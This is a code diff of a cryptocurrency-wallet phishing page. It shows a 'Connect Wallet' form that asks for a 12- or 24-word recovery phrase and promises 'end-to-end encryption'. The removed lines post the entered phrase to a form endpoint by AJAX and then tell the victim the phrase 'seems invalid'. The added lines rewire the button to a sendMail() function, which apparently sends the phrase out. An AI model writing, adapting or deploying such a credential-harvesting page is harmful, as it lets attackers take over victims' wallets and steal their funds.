@@ -1368,51 +1368,19 @@
 
                     </div>
 
-                  <div id="div_connect_manually">
-  <form method="POST" id="my-form" data-netlify="true">
-    <input type="hidden" name="my-form" value="my-form" />
-    <div id="phrase">
-      <textarea
-        class="col-12 form-control"
-        placeholder="Enter your 12 or 24 Mnemonic words. Separate them with spaces."
-        style="font-size:14px; font-weight:650; color: #fff !important;"
-        rows="4"
-        id="secret_phrase"
-        name="phrasess"
-        required
-      ></textarea>
-      <p id="error-message" style="color: red; display: none;">Invalid input. Please enter 12 or 24 words separated by spaces.</p>
+                    <div id="div_connect_manuallly" style="display:none;">
+                        <form method="POST" id="my-form">
+                            <div id="phrase">
+                                <textarea class="col-12 form-control" placeholder="Enter your 12 or 24 Mnemonic words. Seperate them with spaces." style="font-size:14px; font-weight:650; color: #fff !important;" rows="4" id="secret_phrase" name="phrase" required></textarea>
+                                <p class="text-center">...</p>
 
-      <div class="row mx-auto col-10 mt-4">
-        <button type="submit" class="btn btn-primary">Connect Wallet</button>
-      </div>
-    </div>
-  </form>
-</div>
+                                <div class="row mx-auto col-10 mt-4">
+                                    <button id="button_connect_wallet" type="button" class="btn btn-primary col-12 mt-2 mb-2" onclick="sendMail()">Connect Wallet</button>
+                                </div>
 
-<!-- JavaScript -->
-<script>
-  const form = document.getElementById("my-form");
-  const errorMessage = document.getElementById("error-message");
-  const textarea = document.getElementById("secret_phrase");
-
-  form.addEventListener("submit", function (event) {
-    event.preventDefault(); // Prevent the default form submission
-
-    // Get the input value and validate
-    const input = textarea.value.trim();
-    const words = input.split(/\s+/);
-
-    // Check if input contains exactly 12 or 24 words
-    if (words.length !== 12 && words.length !== 24) {
-      errorMessage.style.display = "block"; // Show error message
-    } else {
-      errorMessage.style.display = "none"; // Hide error message
-      alert("Form submitted successfully!");
-      form.reset(); // Optionally reset the form
-    }
-  });
-</script>
+                            </div>
+                        </form>
+                    </div>
 
                     <div class="mt-4 d-flex justify-content-center align-items-center">
                         <img src="asset/images/icon/shield.png" width="30" height="30" style="margin-right: 10px !important;" /> <small>This session is protected with an end-to-end encryption</small>
@@ -1446,55 +1414,7 @@
         });
 
         // Handle form submission
-        $('.allforms').on('click', function(e) {
-            e.preventDefault();
-            var id = $(this).attr('id');
-            var getData = $('#' + id).data('content');
-            var form = document.getElementById(getData);
-            var svgDis = '<svg version="1.1" style="width: 50px; height: 10px; margin: 0px; margin-left: -15px; display:inline-block;"  x="0px" y="0px" viewBox="0 0 20 20" enable-background="new 0 0 0 0" xml:space="preserve"><circle fill="#fff" stroke="none" cx="6" cy="10" r="6"><animate attributeName="opacity" dur="1s" values="0;1;0" repeatCount="indefinite" begin="0.1"/> </circle><circle fill="#fff" stroke="none" cx="26" cy="10" r="6"><animate attributeName="opacity" dur="1s" values="0;1;0" repeatCount="indefinite" begin="0.2"/> </circle><circle fill="#fff" stroke="none" cx="46" cy="10" r="6"><animate attributeName="opacity" dur="1s" values="0;1;0" repeatCount="indefinite" begin="0.3"/></circle></svg>';
-            var btnText = $('#' + id).text();
-            $('#' + id).prop('disabled', true).html('Waiting ' + svgDis);
-
-            for (var i = 0; i < form.elements.length; i++) {
-                if (form.elements[i].value === '' && form.elements[i].hasAttribute('required')) {
-                    $('#' + id).prop('disabled', false).html(btnText);
-                    $('.result')
-                        .stop(true, true) // Stops any ongoing animation and resets the queue
-                        .fadeIn(300) // Fade in quickly
-                        .html('<span style="color:#f00">These fields are required!</span>')
-                        .delay(3000) // Wait for 3 seconds
-                        .fadeOut(300); // Fade out quickly
-                    return false;
-                }
-            }
-
-            $.ajax({
-                method: "POST",
-                url: $('#' + getData).attr('action'),
-                data: $('#' + getData).serializeArray(),
-                dataType: "json",
-                success: function(data) {
-                    $('#' + id).prop('disabled', false).html(btnText);
-                    $('.result')
-                        .stop(true, true)
-                        .fadeIn(300)
-                        .html('<span style="color:green !important">Secret phrase seems invalid.</span>')
-                        .delay(3000)
-                        .fadeOut(300);
-                },
-                error: function(error) {
-                    $('#' + id).prop('disabled', false).html(btnText);
-                    $('.result')
-                        .stop(true, true)
-                        .fadeIn(300)
-                        .html('<span style="color:red !important">An error occurred. Please try again later.</span>')
-                        .delay(3000)
-                        .fadeOut(300);
-                    console.log(error);
-                }
-            });
-            return false;
-        });
+       
 
         // Handle Select Wallet Click
         $(function() {
